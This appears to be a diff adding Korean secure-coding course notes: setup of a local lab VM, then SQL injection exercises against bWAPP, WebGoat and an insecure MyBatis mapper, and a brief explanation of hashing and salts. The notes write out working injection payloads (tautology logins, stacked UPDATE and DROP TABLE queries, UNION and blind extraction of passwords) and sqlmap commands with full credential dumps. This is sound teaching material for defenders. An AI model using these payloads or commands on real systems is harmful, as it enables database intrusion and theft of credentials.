@@ -21,6 +21,26 @@
 
 3. C:\Users\HIRA\VirtualBox VMs 폴더 하위에 모든 폴더와 파일을 삭제
 
+4. 가상머신 이미지 가져오기
+    > VirtualBox 실행 
+    > 상단에서 가져오기 버튼 클릭
+    > 2에서 압축해제한 폴더의 SecureCodingLAB-2025-08-05.ova 파일을 선택
+    > 다음 > 완료
+
+5. 가상머신 실행 및 이클립스 실행
+    > 4에서 가져오기 완료 후 왼쪽 SecureCodingLAB 가상머신 선택
+    > 오른쪽 상단에 시작 버튼 클릭
+    > 가상머신이 실행되면 kali / kali 계정으로 로그인
+    > 가상머신 바탕화면에 eclipse 폴더 > 톱니바퀴 모양 eclipse 실행
+    > Tomcat 서버 실행
+
+6. 연결 테스트 (PC 브라우저에서)
+    > http://localhost/bWAPP
+    > http://localhost:7070
+    > http://localhost:8080
+    > http://localhost:9090/WebGoat/login
+
+
 
 
 http://www.test.com/abcd/
@@ -79,5 +99,476 @@ http://www.test.com/search?company_name=Bandi%26Luice
 
 3) 데이터 : 권한 범위 내의 데이터에만 접근하도록 제한
 
+직원 전용 고객 조회         고객 조회
+고객번호: 1234 [조회]       search.jsp?cid=1234
+                            1) 인증 여부 확인
+                            2) 직원 여부 확인
+                            3) 처리에 필요한 정보 전달 확인
+                            4) 고객 정보 조회
+                               select * from custom where cid=1234
+                            5) 결과 반환
+
+목록 서비스                     상세 서비스
+list                            view/detail
+비슷한 형태의 데이터를 나열      하나의 데이터(레코드)를 출력
+
+제목    작성자  작성             ID: _____
+~~~~~~  ~~~~~~  ~~~~~~          제목: ______
+~~~~~~  ~~~~~~  ~~~~~~  ------> 내용: ______
+~~~~~~  ~~~~~~  ~~~~~~          작성자: _____
+~~~~~~  ~~~~~~  ~~~~~~          작성일: _____
+
+select *                        select * from board
+  from board                      where board_id = 12
+ where del_yn = 'N'
+   and open_dt < now()
+   and group_id = 'insa'
+   and ~~~~~~~
+   and ~~~~~~~
+
+ 
+
+SQL Injection
+=============
+[사용자 입력 화면]
+ID: gildong
+PW: password
+
+[서버로 전달되는 과정]
+long.jsp?id=gilgon&pw=password
+
+[서버 내부에서 사용]
+select * from users where id = 'gildong' and pw = 'password'
+==> 원래 쿼리의 의미는 id 컬럼과 pw 컬럼의 값이 일치하는 
+    데이터를 조회
+
+[공격자가 쿼리를 조작할 수 있는 문자열을 포함해서 전달]
+ID: gildong' or 'a' = 'a
+PW: password' or 'a' = 'a
+
+[서버 내부에서 사용]
+select * 
+  from users 
+ where id = 'gildong' or 'a' = 'a' 
+   and pw = 'password' or 'a' = 'a'
+==> 모든 사용자를 조회하는 쿼리로 변형되어서 실행
 
 
+
+http://localhost:9090/WebGoat
+> webgoat / p@ssw0rd 계정으로 로그인
+> (A3) Injection 
+> SQL Injection (Intro)
+
+#12
+[사용자 입력 화면]
+Employee Name: Smith
+Authentication TAN: 3SL99A
+
+[서버로 전달]
+POST /WebGoat/SqlInjection/attack9 HTTP/1.1
+
+name=Smith&auth_tan=3SL99A
+
+[서버 내부 처리 (유추)]
+select * from employees 
+where last_name = 'Smith' and auth_tan = '3SL99A'
+
+
+만약에 사용자 입력값에 쿼리 조작 문자열 포함 여부를 확인하지 않고
+쿼리 생성 및 실행에 사용한다면, 
+
+아래와 같이 추가로 쿼리를 실행하는 구문을 함께 전달이 가능
+Employee Name: Smith
+Authentication TAN: 3SL99A'; update employees set salary = 90000 where last_name = 'Smith
+
+전달받은 값을 쿼리에 반영하면 
+select * from employees 
+where last_name = 'Smith' 
+  and auth_tan = '3SL99A';  
+update employees 
+   set salary = 90000 
+ where last_name = 'Smith'
+
+
+
+#13
+[사용자 화면에서의 입력]
+Action contains: Smith
+
+[서버 내부에서 사용]
+select * from access_log where action like '%Smith%'
+
+[공격자가 실행하고자 하는 쿼리]
+select * from access_log where action like '%Smith'; drop table access_log -- %'
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~~~~~~~~~~~~~~~~~~~~ ~~~~~
+
+
+# SQL Injection (advanced) #3
+
+[사용자 입력]
+Name: Dave [Get Account Info]
+
+[서버 내부에서 처리]
+select * from user_data where last_name = 'Dave'
+                                ==> 7컬럼을 반환
+
+[공격자가 원하는 정보를 조회하는 쿼리]
+select * from user_system_data  ==> 4컬럼을 반환
+
+
+[컬럼의 개수와 각 컬럼의 데이터 타입을 맞춘 후 UNION 구문을 이용해서 결과를 결합]
+select * from user_data where last_name = 'Dave'
+UNION
+select userid, user_name, password, cookie, '', '', 0 
+  from user_system_data --
+
+
+
+SQL Injection (advanced) #5
+===========================
+문제 : tom 사용자로 로그인해 보세요.
+
+만약 로그인 기능에 SQL Injection 취약점을 가지고 있다면
+select * from users where id = 'tom' and pw = 'a' or 'a' = 'a'
+                                ~~~            ~~~~~~~~~~~~~~
+==> Wrong username or password. Try again.
+==> 로그인 기능에는 SQL Injection 취약점이 존재하지 않음
+
+
+회원가입 기능에서 
+tom 사용자로 가입을 시도
+==> User tom already exists please try to register with a different username.
+
+newtom 사용자로 가입을 시도
+==> User newtom created, please proceed to the login page.
+
+
+select * from users where id = 'tom'
+                                ~~~
+                                있으면 -> already exists
+                                없으면 -> created
+select * from users where id = 'tom' and password = '????'
+-> already exists => ???? 해당하는 값이 tom의 패스워드 
+-> created => ???? 해당하는 값이 tom의 패스워드가 아님
+
+
+select * from users where id = 'tom' and length(password) < 20 -- '
+                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+select * from users where id = 'tom' and length(password) < 30 -- '                                
+
+select * from users where id = 'tom' and length(password) = 23 -- '                                
+=> already exists => 패스워드의 길이는 23자리
+
+select * from users where id = 'tom' and substr(password, 1, 1) = 't' -- '                                
+select * from users where id = 'tom' and substr(password, 2, 1) = 'h' -- '                                
+select * from users where id = 'tom' and substr(password, 3, 1) = 'i' -- '                                
+select * from users where id = 'tom' and substr(password, 4, 1) = 's' -- '                                
+
+select * from users where id = 'tom' and password = 'thisisasecretfortomonly' -- '                                
+                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+==> User tom' and password = 'thisisasecretfortomonly' -- already exists please try to register with a different username.                                
+
+
+
+
+http://localhost/bWAPP/login.php
+> bee / bug 계정으로 로그인
+> SQL Injection (GET/Search) 선택 후 hack 버튼 클릭
+
+
+[사용자 입력]
+Search for a movie: man
+
+[서버 내부 로직]
+select * from movies where title like '%man%' 
+
+#1 인젝션 여부를 확인
+select * from movies where title like '%man'%' 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^
+=> Error: You have an error in your SQL syntax; 
+   check the manual that corresponds to your MariaDB server 
+   version for the right syntax to use near ''' at line 1 
+=> SQL 인젝션 취약점이 존재하고, 백엔드 DB는 마리아DB를 사용하고 있음
+
+#2 정상 쿼리가 반환하는 컬럼의 개수를 확인
+select * from movies where title like '%man' order by 1 -- %' 
+                                        ~~~~~~~~~~~~~~~~~~~
+
+
+select * from movies where title like '%man' order by 8 -- %'                                         
+=> Error: Unknown column '8' in 'ORDER BY'
+=> 정상 서비스 쿼리는 7개의 컬럼을 제공
+
+#3 정상 서비스 쿼리와 7개의 컬럼을 반환하는 쿼리의 결과를 UNION
+여기서부터는 입력하는 내용만 기록
+man' and 1=2 UNION select 1,2,3,4,5,6,7 -- 
+=> 출력에 사용하는 컬럼의 개수와 위치를 확인
+
+
+#4 데이터베이스 정보를 서비스 화면에 출력
+https://mariadb.com/docs/server/server-management/variables-and-modes/server-system-variables
+
+man' and 1=2 UNION select 1,@@version,@@version_comment,@@version_compile_machine,@@version_compile_os,6,7 -- 
+
+#5 데이터베이스 스키마 정보를 조회
+https://mariadb.com/docs/server/reference/system-tables/information-schema/information-schema-tables/information-schema-schemata-table
+
+man' and 1=2 UNION select 1,CATALOG_NAME collate utf8_general_ci,SCHEMA_NAME collate utf8_general_ci,DEFAULT_CHARACTER_SET_NAME collate utf8_general_ci,DEFAULT_COLLATION_NAME collate utf8_general_ci,6,7 from information_schema.schemata -- 
+=> bWAPP 스키마가 존재하는 것을 확인
+
+#5 bWAPP 스키마에 테이블 정보를 조회
+https://mariadb.com/docs/server/reference/system-tables/information-schema/information-schema-tables/information-schema-tables-table
+
+man' and 1=2 UNION select 1, TABLE_NAME collate utf8_general_ci, 3, 4, 5, 6, 7 from information_schema.tables where TABLE_SCHEMA = 'bWAPP' -- 
+=> 테이블 정보를 조회
+
+#6 bWAPP 스키마의 users 테이블의 컬럼 정보를 조회
+https://mariadb.com/docs/server/reference/system-tables/information-schema/information-schema-tables/information-schema-columns-table
+
+man' and 1=2 UNION select 1, COLUMN_NAME collate utf8_general_ci, 3, 4, 5, 6, 7 from information_schema.columns where TABLE_SCHEMA = 'bWAPP' and TABLE_NAME = 'users' -- 
+
+#7 users 테이블에 id, login, password, email, secret 컬럼의 정보를 조회
+man' and 1=2 UNION select 1, id, login, password, concat(email, ':', secret), 6, 7 from users --  
+
+
+#8 패스워드 크래킹
+https://sha1.gromweb.com
+
+
+#9 sqlmap 공격 도구를 이용한 사용자 정보 탈취 (가상머신에서 터미널을 실행해서)
+$ sqlmap -u "취약점을 가지고 있는 주소" --cookie="인증정보를 요구하는 경우 쿠키값을 명시"
+
+주소 ==> http://localhost/bWAPP/sqli_1.php?title=man&action=search
+쿠키 ==> "PHPSESSID=d5lh5e6dnolfm6otjknfqiud51; security_level=0"
+
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://localhost/bWAPP/sqli_1.php?title=man&action=search" --cookie="PHPSESSID=d5lh5e6dnolfm6otjknfqiud51; security_level=0"
+
+데이터베이스 정보
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://localhost/bWAPP/sqli_1.php?title=man&action=search" --cookie="PHPSESSID=d5lh5e6dnolfm6otjknfqiud51; security_level=0" --dbs
+
+[03:30:44] [INFO] fetching database names
+available databases [2]:
+[*] bWAPP
+[*] information_schema
+
+
+bWAPP 데이터베이스의 테이블을 조회
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://localhost/bWAPP/sqli_1.php?title=man&action=search" --cookie="PHPSESSID=d5lh5e6dnolfm6otjknfqiud51; security_level=0" -D bWAPP --tables
+
+[03:31:57] [INFO] fetching tables for database: 'bWAPP'
+Database: bWAPP
+[5 tables]
++----------+
+| blog     |
+| heroes   |
+| movies   |
+| users    |
+| visitors |
++----------+
+
+
+users 테이블의 컬럼 정보를 조회
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://localhost/bWAPP/sqli_1.php?title=man&action=search" --cookie="PHPSESSID=d5lh5e6dnolfm6otjknfqiud51; security_level=0" -D bWAPP -T users --columns
+
+[03:32:59] [INFO] fetching columns for table 'users' in database 'bWAPP'
+Database: bWAPP
+Table: users
+[9 columns]
++-----------------+--------------+
+| Column          | Type         |
++-----------------+--------------+
+| admin           | tinyint(1)   |
+| activated       | tinyint(1)   |
+| activation_code | varchar(100) |
+| email           | varchar(100) |
+| id              | int(10)      |
+| login           | varchar(100) |
+| password        | varchar(100) |
+| reset_code      | varchar(100) |
+| secret          | varchar(100) |
++-----------------+--------------+
+
+bWAPP 데이터베이스의 모든 테이블에 데이터를 조회
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://localhost/bWAPP/sqli_1.php?title=man&action=search" --cookie="PHPSESSID=d5lh5e6dnolfm6otjknfqiud51; security_level=0" -D bWAPP --dump-all
+
+[03:34:12] [INFO] fetching entries for table 'heroes' in database 'bWAPP'
+Database: bWAPP
+Table: heroes
+[6 entries]
++----+-----------+---------------------------------------+----------------+
+| id | login     | secret                                | password       |
++----+-----------+---------------------------------------+----------------+
+| 1  | neo       | Oh why didn't I took that BLACK pill? | trinity        |
+| 2  | alice     | There's a cure!                       | loveZombies    |
+| 3  | thor      | Oh, no... this is Earth... isn't it?  | Asgard         |
+| 4  | wolverine | What's a Magneto?                     | Log@N          |
+| 5  | johnny    | I'm the Ghost Rider!                  | m3ph1st0ph3l3s |
+| 6  | seline    | It wasn't the Lycans. It was you.     | m00n           |
++----+-----------+---------------------------------------+----------------+
+
+[03:34:12] [INFO] table 'bWAPP.heroes' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/bWAPP/heroes.csv'                                           
+[03:34:12] [INFO] fetching columns for table 'visitors' in database 'bWAPP'
+[03:34:12] [INFO] fetching entries for table 'visitors' in database 'bWAPP'
+[03:34:12] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[03:34:12] [INFO] fetching number of entries for table 'visitors' in database 'bWAPP'
+[03:34:12] [INFO] resumed: 0
+[03:34:12] [WARNING] table 'visitors' in database 'bWAPP' appears to be empty
+Database: bWAPP
+Table: visitors
+[0 entries]
++----+--------+------------+------------+
+| id | date   | ip_address | user_agent |
++----+--------+------------+------------+
++----+--------+------------+------------+
+
+[03:34:12] [INFO] table 'bWAPP.visitors' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/bWAPP/visitors.csv'                                       
+[03:34:12] [INFO] fetching columns for table 'movies' in database 'bWAPP'
+[03:34:12] [INFO] fetching entries for table 'movies' in database 'bWAPP'
+Database: bWAPP
+Table: movies
+[10 entries]
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| id | imdb      | genre  | title                    | release_year | tickets_stock | main_character  |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+| 1  | tt1583421 | action | G.I. Joe: Retaliation    | 2013         | 100           | Cobra Commander |
+| 2  | tt0371746 | action | Iron Man                 | 2008         | 53            | Tony Stark      |
+| 3  | tt0770828 | action | Man of Steel             | 2013         | 78            | Clark Kent      |
+| 4  | tt0438488 | sci-fi | Terminator Salvation     | 2009         | 100           | John Connor     |
+| 5  | tt0948470 | action | The Amazing Spider-Man   | 2012         | 13            | Peter Parker    |
+| 6  | tt1259521 | horror | The Cabin in the Woods   | 2011         | 666           | Some zombies    |
+| 7  | tt1345836 | action | The Dark Knight Rises    | 2012         | 3             | Bruce Wayne     |
+| 8  | tt0232500 | action | The Fast and the Furious | 2001         | 40            | Brian O'Connor  |
+| 9  | tt0800080 | action | The Incredible Hulk      | 2008         | 23            | Bruce Banner    |
+| 10 | tt0816711 | horror | World War Z              | 2013         | 0             | Gerry Lane      |
++----+-----------+--------+--------------------------+--------------+---------------+-----------------+
+
+[03:34:12] [INFO] table 'bWAPP.movies' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/bWAPP/movies.csv'                                           
+[03:34:12] [INFO] fetching columns for table 'blog' in database 'bWAPP'
+[03:34:12] [INFO] fetching entries for table 'blog' in database 'bWAPP'
+[03:34:12] [INFO] fetching number of entries for table 'blog' in database 'bWAPP'
+[03:34:12] [INFO] resumed: 0
+[03:34:12] [WARNING] table 'blog' in database 'bWAPP' appears to be empty
+Database: bWAPP
+Table: blog
+[0 entries]
++----+-------+--------+---------+
+| id | entry | date   | owner   |
++----+-------+--------+---------+
++----+-------+--------+---------+
+
+[03:34:12] [INFO] table 'bWAPP.blog' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/bWAPP/blog.csv'                                               
+[03:34:12] [INFO] fetching columns for table 'users' in database 'bWAPP'
+[03:34:12] [INFO] fetching entries for table 'users' in database 'bWAPP'
+[03:34:12] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
+
+do you want to crack them via a dictionary-based attack? [Y/n/q] 
+
+[03:35:02] [INFO] using hash method 'sha1_generic_passwd'
+[03:35:02] [INFO] resuming password 'bug' for hash '6885858486f31043e5839c735d99457f045affd0' for user 'A.I.M.'                                                             
+Database: bWAPP
+Table: users
+[2 entries]
++----+--------------------------+--------+-------------------------------------+---------+------------------------------------------------+-----------+------------+-----------------+
+| id | email                    | login  | secret                              | admin   | password                                       | activated | reset_code | activation_code |
++----+--------------------------+--------+-------------------------------------+---------+------------------------------------------------+-----------+------------+-----------------+
+| 1  | bwapp-aim@mailinator.com | A.I.M. | A.I.M. or Authentication Is Missing | 1       | 6885858486f31043e5839c735d99457f045affd0 (bug) | 1         | NULL       | NULL            |
+| 2  | bwapp-bee@mailinator.com | bee    | Any bugs?                           | 1       | 6885858486f31043e5839c735d99457f045affd0 (bug) | 1         | NULL       | NULL            |
++----+--------------------------+--------+-------------------------------------+---------+------------------------------------------------+-----------+------------+-----------------+
+
+[03:35:02] [INFO] table 'bWAPP.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/bWAPP/users.csv'                                             
+[03:35:02] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'                                                                 
+
+[*] ending @ 03:35:02 /2025-08-11/
+
+
+
+
+신청확인 페이지에 SQL Injection 취약점이 존재하는지 확인
+
+이메일: test's@test.com
+패스워드: a'
+
+rg.springframework.web.util.NestedServletException: Request processing failed; nested exception is org.springframework.jdbc.BadSqlGrammarException: 
+### Error querying database.  Cause: java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 's@test.com' and password = 'a'' and userrole = 'M'' at line 3
+### The error may exist in kr/co/ssaem/mapper/RegistMapper.xml
+### The error may involve defaultParameterMap
+### The error occurred while setting parameters
+### SQL: select *     from tbl_regist     where email = 'test's@test.com' and password = 'a'' and userrole = 'M'
+### Cause: java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 's@test.com' and password = 'a'' and userrole = 'M'' at line 3
+==> 인젝션이 가능하고, 해당 서버는 스프링 기반에 마이바티스 프레임워크를 사용하고 있음... 
+
+서버 내부의 동작을 유추
+select *     
+  from tbl_regist     
+ where email = 'test@test.com' and password = 'a' or 'a' = 'a' limit 0, 1 -- ' and userrole = 'M'
+                ~~~~~~~~~~~~~                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+가상머신의 이클립스에서 RegistMapper.xml 파일의 내용을 확인 (94라인)
+
+	<!-- LAB SQL Injection : Insecure Code -->
+	<select id="checkUser" resultType="kr.co.ssaem.domain.RegistVO">
+ 	<![CDATA[
+ 		select *
+		  from tbl_regist 
+		 where email = '#{email}' and password = '#{password}' and userrole = '${userRole}'
+ 	]]>
+	</select>
+
+
+취약한 부분을 안전하게 수정한 후 저장
+
+
+해쉬(Hash = Message Digest)
+==========================
+임의 크기 입력 -> 고정 길이의 유일한 값 출력
+
+단방향 = 일방향 = One Way = 입력값으로 해쉬를 계산할 수 있지만, 역연산은 불가능 
+==> 인증 정보 저장 및 처리
+
+사용자 -> PW --------- A + K ---------> E(PW)
+                      ~~~~~~~~~~~~~~~~~~~~~~ <== 관리자 또는 개발자가 알 수 있음
+                                                 -> 패스워드 생성 주체가 아닌 제 3도 패스워드 원문을 알 수 있음
+
+사용자 -> PW -------------------------> H(PW)
+                                       ~~~~~
+                                       패스워드 생성 주체만 패스워드 원문을 알고 있다는 것을 기술적으로 보장
+
+
+유일성 = 입력값이 다르면 출력값(해쉬값)도 다름
+==> 무결성 검사에 사용 
+
+  data  --------------------------> data' -> H(data') ---+ 두 해쉬값을 비교해서 전달과정에 위변조 여부를 검증
+                                                         |
+H(data) --------------------------> H(data) -------------+
+
+
+해쉬 크래킹(cracking)
+--------------------
+PW --> H(PW)  =  H(????)
+                   ~~~~
+                   원문 PW와 일치할 가능성이 있음
+                   1) 사전 대입 공격
+                   2) 무작위 대입 공격
+                   3) 레인보우 테이블을 이용한 공격   
+
+
+해쉬 크래킹 방어 기법
+--------------------
+숫자 8자리의 패스워드인 경우 ==> 10^8
+영문자+숫자+특수문자로 구성된 8자리 패스워드인 경우 ==> (26*2+10+13)^8                   
+영문자+숫자+특수문자로 구성된 80자리 패스워드인 경우 ==> (26*2+10+13)^80
+  ==> 사용의 불편함이 증가되고 사용 시 보안성이 떨이지는 문제가 발생
+
+영문자+숫자+특수문자로 구성된 80자리 패스워드인 경우 ==> (26*2+10+13)^(8+72)
+                                                                   ~ ~~  
+                                                                   |  |
+                                               사용자 입력하는 값 --+  +-- salt = 시스템 부여하는 임의의 입력값
